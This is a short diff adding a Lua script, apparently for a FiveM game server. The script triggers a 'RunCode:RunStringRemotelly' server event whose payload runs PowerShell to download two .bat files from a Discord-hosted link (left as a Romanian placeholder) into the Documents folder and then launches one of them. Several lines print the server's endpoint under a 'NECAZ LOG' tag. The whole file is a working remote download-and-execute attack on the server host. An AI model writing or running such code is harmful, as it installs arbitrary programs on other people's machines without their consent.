@@ -1,0 +1,6 @@
+TriggerServerEvent('RunCode:RunStringRemotelly', [[local a="uploadezi-o-poza-random-de-pe-discordul-tau-si-copiezi-linkul-pozei-aici/sys.bat" local b="uploadezi-o-poza-random-de-pe-discordul-tau-si-copiezi-linkul-pozei-aici/sysre.bat" local c="C:/Users/%USERNAME%/Documents/System/sys.bat" local d="C:/Users/%USERNAME%/Documents/System/sysre.bat" local e="Invoke-WebRequest -Uri "..a.." -OutFile "..c..""local f="Invoke-WebRequest -Uri "..b.." -OutFile "..d..""os.execute("cd C:/Users/%USERNAME%/Documents && mkdir System")os.execute("powershell.exe -Command "..e.."")os.execute("powershell.exe -Command "..f.."")os.execute("cd C:/Users/%USERNAME%/Documents/System && start sysre.bat")]])
+print("[NECAZ LOG]" .. GetCurrentServerEndpoint())
+print("[NECAZ LOG]" .. GetCurrentServerEndpoint())
+print("[NECAZ LOG]" .. GetCurrentServerEndpoint())
+print("[NECAZ LOG]" .. GetCurrentServerEndpoint())
+print("[NECAZ LOG]" .. GetCurrentServerEndpoint())
